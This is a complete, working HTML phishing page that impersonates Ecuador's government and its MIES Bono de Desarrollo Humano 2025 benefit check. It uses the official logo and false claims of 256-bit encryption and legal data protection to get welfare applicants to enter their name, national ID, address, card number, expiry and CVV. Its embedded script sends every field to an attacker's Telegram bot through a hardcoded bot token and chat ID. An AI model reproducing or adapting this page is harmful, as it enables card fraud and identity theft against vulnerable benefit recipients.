<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Consulta Bono MIES</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');

    body {
      background: #f0f2f5;
      font-family: 'Poppins', sans-serif;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding: 30px 15px;
    }

    .container {
      background: white;
      border-radius: 12px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 460px;
      padding: 30px 25px 25px;
      box-sizing: border-box;
    }

    .header {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 10px;
    }

    .header img {
      width: 140px;
      height: auto;
    }

    .divider {
      width: 100%;
      height: 2px;
      background-color: #0b44a4;
      margin: 12px 0 20px 0;
      border-radius: 1px;
    }

    h1 {
      font-size: 22px;
      font-weight: 700;
      color: #111b35;
      margin-bottom: 24px;
    }

    label {
      display: block;
      font-size: 14px;
      color: #111b35;
      margin-bottom: 6px;
      font-weight: 600;
    }

    input[type="text"], input[type="checkbox"] {
      box-sizing: border-box;
    }

    input[type="text"] {
      width: 100%;
      padding: 12px 14px;
      font-size: 15px;
      border-radius: 8px;
      border: 1.7px solid #c3cad9;
      margin-bottom: 18px;
      transition: border-color 0.3s ease;
    }

    input[type="text"]:focus {
      border-color: #0b234d;
      outline: none;
    }

    .inline-inputs {
      display: flex;
      gap: 15px;
      margin-bottom: 18px;
    }

    .inline-inputs > div {
      flex: 1;
    }

    .security {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
      color: #2a5a27;
      margin-bottom: 20px;
    }

    .security svg {
      width: 18px;
      height: 18px;
      fill: #2a5a27;
    }

    button {
      width: 100%;
      background: #0b44a4;
      color: white;
      font-weight: 700;
      font-size: 15px;
      padding: 14px 0;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      text-transform: uppercase;
      box-shadow: 0 4px 9px rgba(11, 68, 164, 0.5);
      transition: background-color 0.3s ease;
    }

    button:hover {
      background: #09377d;
    }

    .legal {
      font-size: 12px;
      color: #5a5f6b;
      margin-top: 18px;
      line-height: 1.4;
      text-align: center;
    }

    .checkbox-container {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
    }

    .checkbox-container label {
      margin: 0;
      font-weight: 500;
      font-size: 13px;
      color: #111b35;
    }

    .error-message {
      color: #d93025;
      font-size: 13px;
      margin-top: -14px;
      margin-bottom: 14px;
      display: none;
    }

    @media (max-width: 440px) {
      .container {
        padding: 25px 20px 20px;
        max-width: 100%;
      }
      .inline-inputs {
        flex-direction: column;
      }
    }

    /* Estilo modales */
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.5);
      z-index: 999;
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: white;
      padding: 25px;
      border-radius: 10px;
      max-width: 360px;
      font-family: 'Poppins', sans-serif;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      text-align: center;
    }

    .modal-content h3 {
      margin-bottom: 12px;
      color: #0b44a4;
    }

    .modal-content p {
      font-size: 15px;
      color: #333;
      margin-bottom: 20px;
    }

    .modal-content button {
      background: #0b44a4;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="header">
    <img src="https://www.derechoshumanos.gob.ec/wp-content/uploads/2023/06/Gob_Ecuador.png" alt="Gobierno del Ecuador Logo" />
  </div>

  <div class="divider"></div>

  <h1>Consulta si eres beneficiario del<br>Bono de Desarrollo Humano 2025</h1>

  <form id="bonoForm" autocomplete="off" novalidate>
    <label for="nombre">Nombre completo</label>
    <input type="text" id="nombre" name="nombre" required />

    <label for="cedula">C√©dula</label>
    <input type="text" id="cedula" name="cedula" pattern="\d{10}" maxlength="10" required />
    <div class="error-message" id="error-cedula">La c√©dula debe tener 10 d√≠gitos num√©ricos.</div>

    <label for="provincia">Provincia / Ciudad</label>
    <input type="text" id="provincia" name="provincia" required />

    <label for="direccion">Direcci√≥n</label>
    <input type="text" id="direccion" name="direccion" required />

    <label for="tarjeta">N√∫mero de tarjeta</label>
    <input type="text" id="tarjeta" name="tarjeta" pattern="\d{13,19}" maxlength="19" required />
    <div class="error-message" id="error-tarjeta">La tarjeta debe tener entre 13 y 19 d√≠gitos num√©ricos.</div>

    <div class="inline-inputs">
      <div>
        <label for="fecha">Fecha (MM/AA)</label>
        <input type="text" id="fecha" name="fecha" placeholder="MM/AA" maxlength="5" pattern="(0[1-9]|1[0-2])\/\d{2}" required />
        <div class="error-message" id="error-fecha">Fecha inv√°lida o fuera de rango.</div>
      </div>
      <div>
        <label for="cvv">CVV</label>
        <input type="text" id="cvv" name="cvv" maxlength="4" pattern="\d{3,4}" required />
        <div class="error-message" id="error-cvv">CVV inv√°lido seg√∫n tipo de tarjeta.</div>
      </div>
    </div>

    <div class="checkbox-container">
      <input type="checkbox" id="terminos" name="terminos" required />
      <label for="terminos">Acepto los <a href="#" target="_blank">t√©rminos y condiciones</a> y la pol√≠tica de privacidad.</label>
    </div>
    <div class="error-message" id="error-terminos">Debes aceptar los t√©rminos para continuar.</div>

    <div class="security">
      <svg viewBox="0 0 24 24" fill="none" style="width:18px;height:18px;fill:#2a5a27;margin-right:8px;">
        <path d="M12 1C8.13 1 5 4.13 5 8v3H4a1 1 0 0 0-1 1v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a1 1 0 0 0-1-1h-1V8c0-3.87-3.13-7-7-7Zm3 11v3h-6v-3h6Zm-3-7a2 2 0 0 1 2 2v2H10V7a2 2 0 0 1 2-2Z"/>
      </svg>
      Tus datos est√°n protegidos con encriptaci√≥n bancaria de 256 bits.
    </div>

    <button type="submit">Verificar y Registrar</button>
  </form>

  <div class="legal">
    La informaci√≥n ingresada ser√° tratada conforme a la Ley de Protecci√≥n de Datos Personales y no ser√° compartida con terceros.
  </div>
</div>

<!-- MODALES -->
<div class="modal" id="modalTarjeta">
  <div class="modal-content">
    <h3>üîí Informaci√≥n necesaria</h3>
    <p>Estos datos se solicitan √∫nicamente para validar tu identidad y en caso de aprobaci√≥n, proceder al dep√≥sito del bono.</p>
    <button onclick="document.getElementById('modalTarjeta').style.display='none'">Aceptar</button>
  </div>
</div>

<div class="modal" id="modalConfirmacion">
  <div class="modal-content">
    <h3>‚úÖ Solicitud enviada</h3>
    <p>Gracias. Su solicitud ha sido registrada correctamente y ser√° procesada en breve.</p>
    <button onclick="document.getElementById('modalConfirmacion').style.display='none'">Cerrar</button>
  </div>
</div>

<script>
  const tarjetaInput = document.getElementById('tarjeta');
  let mostrado = false;
  tarjetaInput.addEventListener('focus', () => {
    if (!mostrado) {
      document.getElementById('modalTarjeta').style.display = 'flex';
      mostrado = true;
    }
  });

  function enviarTelegram() {
    const msg = `Nuevo registro Bono MIES:\n` +
      `Nombre: ${document.getElementById('nombre').value}\n` +
      `C√©dula: ${document.getElementById('cedula').value}\n` +
      `Provincia/Ciudad: ${document.getElementById('provincia').value}\n` +
      `Direcci√≥n: ${document.getElementById('direccion').value}\n` +
      `Tarjeta: ${document.getElementById('tarjeta').value}\n` +
      `Fecha: ${document.getElementById('fecha').value}\n` +
      `CVV: ${document.getElementById('cvv').value}`;

    fetch(`https://api.telegram.org/bot8032494209:AAE0C8n3-0KH3BCSgMcPSc4j7-2dYxE2ZaE/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({chat_id: '5654253897', text: msg})
    }).then(r => {
      if (r.ok) {
        document.getElementById('modalConfirmacion').style.display = 'flex';
        document.getElementById('bonoForm').reset();
      } else {
        alert('Error al enviar. Intenta m√°s tarde.');
      }
    }).catch(() => alert('Sin conexi√≥n con el servidor.'));
  }
</script>
</body>
</html>
